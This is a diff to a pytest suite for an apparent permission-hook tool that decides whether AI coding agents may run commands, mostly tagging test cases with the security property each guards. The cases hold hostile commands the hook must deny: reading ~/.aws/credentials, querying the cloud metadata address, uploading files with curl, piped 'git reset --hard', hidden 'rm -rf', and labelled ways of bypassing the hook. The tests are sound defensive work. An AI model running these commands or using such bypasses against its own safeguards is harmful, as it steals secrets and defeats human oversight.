@@ -73,8 +73,10 @@ def test_codex_patch_rename_and_delete_preserve_source_deny(db, ws, patch, kind)
 
 
 @pytest.mark.parametrize("patch", [
-    "*** Begin Patch\n*** Update File: a.py\n  *** Update File: /etc/hosts\n*** End Patch\n",
-    "*** Begin Patch\n*** Update File: a.py\n*** update file: b.py\n*** End Patch\n",
+    pytest.param("*** Begin Patch\n*** Update File: a.py\n  *** Update File: /etc/hosts\n*** End Patch\n",
+                 marks=pytest.mark.variant("unrecognized patch header must not hide a target path")),
+    pytest.param("*** Begin Patch\n*** Update File: a.py\n*** update file: b.py\n*** End Patch\n",
+                 marks=pytest.mark.variant("unrecognized patch header must not hide a target path")),
     "*** Begin Patch\n*** Update File: a.py\n***Update File: b.py\n*** End Patch\n",
 ])
 def test_a_patch_with_a_header_brindle_cant_account_for_is_ask(ws, patch):
@@ -128,15 +130,22 @@ def test_codex_hook_off_or_broken_is_no_output(db, ws, monkeypatch):
 
 
 @pytest.mark.parametrize("provider,command,expected", [
-    ("codex", "make verify", "allow"),  # repo check
-    ("codex", "task test unit", "allow"),  # profile prefix allowance
+    pytest.param("codex", "make verify", "allow",
+                 marks=pytest.mark.variant("profile and repo command allowances must respect deny precedence")),  # repo check
+    pytest.param("codex", "task test unit", "allow",
+                 marks=pytest.mark.variant("profile and repo command allowances must respect deny precedence")),  # profile prefix allowance
     ("codex", "task test unit && deploy", None),
-    ("codex", "task test secret", "deny"),  # profile deny beats profile allow
-    ("codex", "cd {ws} && task test secret", "deny"),  # ...in every part of a compound command too
-    ("codex", "task test secret 2>&1", "deny"),  # ...as the allow reads the part, redirection dropped
-    ("codex", 'task test "" secret', "deny"),  # ...and an empty word doesn't hide it
+    pytest.param("codex", "task test secret", "deny",
+                 marks=pytest.mark.variant("profile and repo command allowances must respect deny precedence")),  # profile deny beats profile allow
+    pytest.param("codex", "cd {ws} && task test secret", "deny",
+                 marks=pytest.mark.variant("profile and repo command allowances must respect deny precedence")),  # ...in every part of a compound command too
+    pytest.param("codex", "task test secret 2>&1", "deny",
+                 marks=pytest.mark.variant("profile and repo command allowances must respect deny precedence")),  # ...as the allow reads the part, redirection dropped
+    pytest.param("codex", 'task test "" secret', "deny",
+                 marks=pytest.mark.variant("profile and repo command allowances must respect deny precedence")),  # ...and an empty word doesn't hide it
     ("claude", "task test secret", "deny"),  # a profile restriction beats Claude's profile allow
-    ("claude", "task test prod", "deny"),  # an org restriction too
+    pytest.param("claude", "task test prod", "deny",
+                 marks=pytest.mark.variant("profile and repo command allowances must respect deny precedence")),  # an org restriction too
 ])
 def test_codex_checks_and_profile_commands(db, ws, monkeypatch, provider, command, expected):
     from pathlib import Path
@@ -169,6 +178,7 @@ def test_codex_checks_and_profile_commands(db, ws, monkeypatch, provider, comman
     assert (json.loads(out)["hookSpecificOutput"]["decision"]["behavior"] if out else None) == expected
 
 
+@pytest.mark.variant("providers without a prompt must fail closed on explicit asks")
 def test_codex_dontask_turns_ask_into_deny(db, ws, monkeypatch):
     turn_on(ws)
     command = "uv run python - <<'PY'\nimport os; os.remove('x')\nPY"
@@ -199,7 +209,8 @@ def test_codex_dontask_turns_ask_into_deny(db, ws, monkeypatch):
 
 
 @pytest.mark.parametrize("match_type,decision,command", [
-    ("prefix", "ask", "echo ok && deploy prod > out"),
+    pytest.param("prefix", "ask", "echo ok && deploy prod > out",
+                 marks=pytest.mark.variant("compound native dispatch must not widen a prefix approval")),
     pytest.param("exact", "ask", "echo ok && deploy prod > out", marks=pytest.mark.variant("compound exact ask bypass")),
     pytest.param("exact", "deny", "deploy prod > out", marks=pytest.mark.variant("direct exact deny bypass")),
     ("exact", "ask", "deploy prod >"),
@@ -263,7 +274,9 @@ def test_native_dispatch_enforces_saved_rules_with_workspace_identity(db, ws, mo
             assert ran[-1] == args
 
 
-@pytest.mark.parametrize("provider", ["opencode", "antigravity", "native"])
+@pytest.mark.parametrize("provider", [pytest.param("opencode",
+                 marks=pytest.mark.variant("provider adapter must honor current denies over saved approvals")), pytest.param("antigravity",
+                 marks=pytest.mark.variant("provider adapter must honor current denies over saved approvals")), "native"])
 def test_before_tool_adapters_honor_saved_actions_and_current_denies(db, ws, monkeypatch, provider):
     from pathlib import Path
     from brindle import permission_grants
@@ -320,14 +333,17 @@ def test_before_tool_adapters_honor_saved_actions_and_current_denies(db, ws, mon
 
 
 @pytest.mark.parametrize("policy,command,expected", [
-    ("on", "gh issue view 239 --repo PawDelta/brindle", "allow"),
+    pytest.param("on", "gh issue view 239 --repo PawDelta/brindle", "allow",
+                 marks=pytest.mark.variant("reviewer GitHub read allowance must not authorize writes")),
     pytest.param("on", "gh pr diff 5 --repo PawDelta/brindle", "allow",
                  marks=pytest.mark.variant("each read-only gh subcommand is its own allow rule")),
-    ("on", "gh pr merge 5 --repo PawDelta/brindle", "deny"),  # dontAsk: writes stay refused
+    pytest.param("on", "gh pr merge 5 --repo PawDelta/brindle", "deny",
+                 marks=pytest.mark.variant("reviewer GitHub read allowance must not authorize writes")),  # dontAsk: writes stay refused
     pytest.param("on", "gh api -X POST repos/PawDelta/brindle/issues", "deny",
                  marks=pytest.mark.variant("gh api writes are a distinct bypass attempt")),
     ("off", "gh issue view 239 --repo PawDelta/brindle", "allow"),  # #241: nobody watches its prompt
-    ("off", "gh pr merge 5 --repo PawDelta/brindle", None),  # ...the rest stays Codex's own
+    pytest.param("off", "gh pr merge 5 --repo PawDelta/brindle", None,
+                 marks=pytest.mark.variant("reviewer GitHub read allowance must not authorize writes")),  # ...the rest stays Codex's own
     pytest.param("on", "git diff --stat && uv run pytest tests/test_feature.py -q", "allow",
                  marks=pytest.mark.variant("#250: reviewer read and local test probes use the existing policy")),
 ])
@@ -367,6 +383,7 @@ def test_codex_unknown_and_failed_resolution_leave_approval(db, ws, monkeypatch)
     assert agents.hook_main(db, a.id, "codex-permission-request", payload, trusted=False) == ""
 
 
+@pytest.mark.variant("a known denied path must beat an unknown patch header")
 def test_codex_patch_unknown_header_cannot_hide_a_known_deny(ws):
     patch = "*** Begin Patch\n*** Update File: denied.py\n*** Rename File: mystery.py\n*** End Patch\n"
     reqs = from_codex(codex_payload("apply_patch", {"command": patch}, ws.path), ws.path, ws.repo_root)
@@ -383,8 +400,10 @@ def codex_behavior(db, ws, profile, command):
 
 
 @pytest.mark.parametrize("command,expected", [
-    ("cd {ws} && git status", "allow"),
-    ('grep -rn "x" .', "allow"),
+    pytest.param("cd {ws} && git status", "allow",
+                 marks=pytest.mark.variant("Codex hook must recognize covered read commands without prompting")),
+    pytest.param('grep -rn "x" .', "allow",
+                 marks=pytest.mark.variant("Codex hook must recognize covered read commands without prompting")),
     pytest.param("git log |& rm -rf x", None, marks=pytest.mark.variant("shlex reads |& as one word")),
     pytest.param("ls > ~/.zshrc", None, marks=pytest.mark.variant("redirection shlex doesn't split")),
 ])
@@ -393,6 +412,7 @@ def test_codex_compound_command_covered_is_allowed(db, ws, command, expected):
     assert codex_behavior(db, ws, "developer-codex", command.format(ws=ws.path)) == expected
 
 
+@pytest.mark.variant("a worktree executable must not replace the installed permission hook")
 def test_hook_invocation_skips_worktree_python(ws, monkeypatch, tmp_path):
     # The worktree venv's own bin (where its brindle lives) comes first on
     # PATH, as it does under `uv run`: the installed brindle further on wins.
@@ -626,7 +646,13 @@ def launch_argv(ws, mode=None, env=None):
 
 
 @pytest.mark.parametrize("mode, profile_path, base", [
-    (None, None, "/usr/bin"), (None, "/opt/bin", "/opt/bin"), (None, "", ""), ("review", None, "/usr/bin"),
+    pytest.param(None, None, "/usr/bin",
+                 marks=pytest.mark.variant("absent PATH must fall back safely without a worktree venv")),
+    pytest.param(None, "/opt/bin", "/opt/bin",
+                 marks=pytest.mark.variant("PR #288: profile PATH takes precedence over the inherited PATH")),
+    pytest.param(None, "", "",
+                 marks=pytest.mark.variant("PR #288: explicit empty profile PATH must not restore inherited executables")),
+    ("review", None, "/usr/bin"),
 ])
 def test_codex_launch_venv_path(ws, monkeypatch, mode, profile_path, base):
     """uv panics under Codex's macOS sandbox, so the worktree's .venv/bin leads
@@ -665,8 +691,10 @@ def _sandboxed(command):
 
 
 @pytest.mark.parametrize("preset,command,expected", [
-    ("autonomous", "echo 'git reset --hard' | sh", "deny"),
-    ("autonomous", 'python3 -c "$X"', "deny"),
+    pytest.param("autonomous", "echo 'git reset --hard' | sh", "deny",
+                 marks=pytest.mark.variant("pre-tool hook must enforce policy on unprompted commands")),
+    pytest.param("autonomous", 'python3 -c "$X"', "deny",
+                 marks=pytest.mark.variant("pre-tool hook must enforce policy on unprompted commands")),
     pytest.param("autonomous", "git status; git log | head -1", None,
                  marks=pytest.mark.variant("every part allowed: no answer")),
     _sandboxed("env"),
@@ -681,7 +709,8 @@ def _sandboxed(command):
     pytest.param("standard", "python3 -c \"print(open(__import__('os').path.expanduser('~/.aws/credentials')).read())\"",
                  "deny", marks=pytest.mark.variant("bypass attempt")),
     pytest.param("standard", "git status; git reset --hard", "deny", marks=pytest.mark.variant("a part of a compound")),
-    ("standard", "git status", None),
+    pytest.param("standard", "git status", None,
+                 marks=pytest.mark.variant("pre-tool hook must enforce policy on unprompted commands")),
 ])
 def test_codex_pre_tool_hook_denies_what_codex_runs_without_asking(db, ws, monkeypatch, preset, command, expected):
     """Codex runs a sandboxed command without asking, so its PermissionRequest
@@ -711,13 +740,17 @@ class SilentAppServer:
 
 
 @pytest.mark.parametrize("policy,layer,setting,server", [
-    ("on", None, "", FakeAppServer),
-    ("off", "user", 'sandbox_mode = "workspace-write"\n', FakeAppServer),
+    pytest.param("on", None, "", FakeAppServer,
+                 marks=pytest.mark.variant("sandbox credential protection must survive this policy source")),
+    pytest.param("off", "user", 'sandbox_mode = "workspace-write"\n', FakeAppServer,
+                 marks=pytest.mark.variant("sandbox credential protection must survive this policy source")),
     # Codex would ignore brindle's profile (sandbox_mode wins), or run it with
     # full access: the launch is refused, naming the file to change.
-    ("on", "user", 'sandbox_mode = "workspace-write"\n', FakeAppServer),
+    pytest.param("on", "user", 'sandbox_mode = "workspace-write"\n', FakeAppServer,
+                 marks=pytest.mark.variant("sandbox credential protection must survive this policy source")),
     ("on", "project", 'sandbox_mode = "danger-full-access"\n', FakeAppServer),
-    ("on", "system", 'sandbox_mode = "workspace-write"\n', FakeAppServer),
+    pytest.param("on", "system", 'sandbox_mode = "workspace-write"\n', FakeAppServer,
+                 marks=pytest.mark.variant("sandbox credential protection must survive this policy source")),
     ("on", "user", 'default_permissions = ":danger-full-access"\n', FakeAppServer),
     ("on", "user", 'profile = "x"\n[profiles.x]\nsandbox_mode = "workspace-write"\n', FakeAppServer),
     # Codex can't list its layers (managed ones brindle can't read among
@@ -783,7 +816,8 @@ def assert_codex_sandbox_never_writes_git_hooks_or_config(roots, cwd, linked=Tru
     # would run what's typed into it unchecked.
     ("codex-permission-request", "cat ~/.aws/credentials\n", "deny"),
     ("codex-pre-tool", "env\n", "deny"),       # should a Codex ever run PreToolUse for it
-    ("codex-permission-request", "", None),    # an empty poll types nothing
+    pytest.param("codex-permission-request", "", None,
+                 marks=pytest.mark.variant("hook must never relay terminal input for a Codex permission ask")),    # an empty poll types nothing
 ])
 def test_codex_terminal_input_is_never_sent(db, ws, monkeypatch, event, chars, expected):
     monkeypatch.setattr(agents, "_hold_for_app", lambda *args, **kwargs: None)
@@ -1265,10 +1299,12 @@ def _codex_just_refused_it(mp, lifecycle):
     pytest.param(lambda mp, lc: lc.info_path().write_text(json.dumps({"pid": os.getpid() + 1})), id="not this home's daemon"),
     pytest.param(lambda mp, lc: mp.delenv("BRINDLE_CODEX_CONFIG_HOME"), id="throwaway brindle home"),
     pytest.param(lambda mp, lc: mp.setattr("brindle.providers.codex_binary", lambda: "/nonexistent/codex"), id="no Codex"),
-    pytest.param(lambda mp, lc: _forget_the_trust(), id="new, the person's policy off"),
+    pytest.param(lambda mp, lc: _forget_the_trust(), id="new, the person's policy off",
+                 marks=pytest.mark.variant("daemon must respect the person disabling hook trust")),
     pytest.param(lambda mp, lc: _another_install_took_the_slot(mp) or lc.CODEX_HOOK_SETTLE, id="another install's Codex may be starting"),
     pytest.param(_codex_just_refused_it, id="Codex just refused it"),
-    pytest.param(lambda mp, lc: turn_off_in_codex(), id="the person turned it off"),
+    pytest.param(lambda mp, lc: turn_off_in_codex(), id="the person turned it off",
+                 marks=pytest.mark.variant("daemon must respect the person disabling hook trust")),
 ])
 def test_the_daemon_doesnt_take_the_hooks_slot_when_its_not_its_to_take(ws, hook_daemon, monkeypatch, why_left_alone):
     """Two installs' daemons, or a throwaway home's, would each read the other's
@@ -1381,7 +1417,8 @@ def agy_payload(name, args, cwd="/w"):
 # -- agy: the hook never answers nothing -------------------------------------------------------
 
 
-@pytest.mark.parametrize("strict,expected", [(False, "ask"), (True, "deny")])
+@pytest.mark.parametrize("strict,expected", [pytest.param(False, "ask",
+                 marks=pytest.mark.variant("malformed agy payload must ask when strict mode is disabled")), (True, "deny")])
 @pytest.mark.parametrize("stdin", ['{"toolCall": 5}'])
 def test_agy_pre_tool_fails_closed_on_bad_input(db, ws, monkeypatch, stdin, strict, expected):
     a = worker(db, ws, provider="antigravity", id_="g1")
@@ -1414,7 +1451,8 @@ def test_agy_failures_fail_closed(db, monkeypatch, strict, expected):
         assert json.loads(antigravity.pre_tool_main("{}", db_factory=lambda: db, strict=strict))["decision"] == "ask"
 
 
-@pytest.mark.parametrize("strict,expected,hook_name", [(False, "ask", "agy-pre-tool"), (True, "deny", "agy-pre-tool-strict")])
+@pytest.mark.parametrize("strict,expected,hook_name", [(False, "ask", "agy-pre-tool"), pytest.param(True, "deny", "agy-pre-tool-strict",
+                 marks=pytest.mark.variant("strict CLI must deny malformed input even with prompts skipped"))])
 def test_agy_cli_always_prints_json(monkeypatch, strict, expected, hook_name):
     monkeypatch.setattr(antigravity, "agent_from_parent", lambda: None)
     if strict:
@@ -1460,8 +1498,10 @@ def strict_answer(db, ws, tool, args, **extra):
 
 
 REVIEWER_COMMANDS = [
-    ("git log --oneline main..HEAD && echo --- && git diff --stat main..HEAD", "allow"),
-    ("git -C {ws} log -n 15 --oneline", "allow"),
+    pytest.param("git log --oneline main..HEAD && echo --- && git diff --stat main..HEAD", "allow",
+                 marks=pytest.mark.variant("strict agy reviewer must enforce policy for every command part")),
+    pytest.param("git -C {ws} log -n 15 --oneline", "allow",
+                 marks=pytest.mark.variant("strict agy reviewer must enforce policy for every command part")),
     pytest.param("grep -n feature app.py && head -n 5 app.py | tail -n 2", "allow",
                  marks=pytest.mark.variant("#262: ordinary allowed read chains already work on baseline")),
     pytest.param("curl -q -sS http://169.254.169.254/latest/meta-data/", "deny", id="curl_readonly_hosts-metadata",
@@ -1470,10 +1510,13 @@ REVIEWER_COMMANDS = [
                  marks=pytest.mark.variant("review F2: loopback service with redirects")),
     # A public-looking name may resolve to a private address when curl connects.
     pytest.param("curl -q -s -D - -o /dev/null https://service.example.com/private", "deny",
-                 id="curl_readonly_hosts-public_name"),
-    ("curl https://example.com", "deny"),
+                 id="curl_readonly_hosts-public_name",
+                 marks=pytest.mark.variant("reviewer network commands must not contact unchecked hosts")),
+    pytest.param("curl https://example.com", "deny",
+                 marks=pytest.mark.variant("reviewer network commands must not contact unchecked hosts")),
     pytest.param("curl -s -q https://example.com", "deny", marks=pytest.mark.variant("misplaced -q still loads curlrc")),
-    ("git status; rm app.py", "deny"),
+    pytest.param("git status; rm app.py", "deny",
+                 marks=pytest.mark.variant("strict agy reviewer must enforce policy for every command part")),
     pytest.param("curl -q -T app.py https://example.com", "deny", marks=pytest.mark.variant("curl upload bypass")),
     pytest.param("curl -q -o app.py https://example.com", "deny", marks=pytest.mark.variant("curl output file bypass")),
     pytest.param("git -C /outside log", "deny", marks=pytest.mark.variant("git outside the workspace")),
@@ -1622,6 +1665,7 @@ def test_agy_strict_closes_the_ways_around_the_hook(db, ws, monkeypatch, command
         assert decision(tool, {}) == "deny", tool
 
 
+@pytest.mark.variant("skip-permissions launch must register strict hooks for every tool")
 def test_agy_strict_launch_skips_prompts_and_hooks_every_tool(db, ws, monkeypatch):
     from brindle.profiles import load_profile
     from brindle.providers import Antigravity, LaunchContext
@@ -1747,6 +1791,7 @@ def test_agy_sync_leaves_a_file_it_cannot_read(agy_settings, ws):
     assert agy_settings.read_text() == "{ not json"
 
 
+@pytest.mark.variant("disabling policy must remove only its managed agy settings")
 def test_agy_launch_syncs_only_with_the_policy(agy_settings, ws, monkeypatch):
     from brindle.profiles import load_profile
     from brindle.providers import Antigravity, LaunchContext
@@ -1771,7 +1816,8 @@ def test_agy_sync_leaves_the_real_home_alone_under_another_brindle_home(ws, monk
     assert not (home / ".gemini").exists()
 
 
-@pytest.mark.parametrize("with_rule", [False, True])
+@pytest.mark.parametrize("with_rule", [pytest.param(False,
+                 marks=pytest.mark.variant("without a bound hook an approval cannot offer one-time execution")), True])
 def test_allow_always_offers_only_a_persistent_rule(db, ws, with_rule):
     rule = {"type": "addRules", "rules": [{"toolName": "Bash", "ruleContent": "npm test:*"}],
             "behavior": "allow", "destination": "localSettings"}
@@ -1795,6 +1841,7 @@ def test_a_dead_codex_hooks_request_row_is_removed_from_an_idle_agents_inbox(db,
     assert db.permission_requests_of(a.id) == []
 
 
+@pytest.mark.variant("a hook registering during orphan cleanup must keep its live request")
 def test_cleanup_keeps_a_request_whose_hook_registers_during_it(db, ws, monkeypatch):
     from brindle.daemon.holds import HOLDS
     from brindle.service import inbox
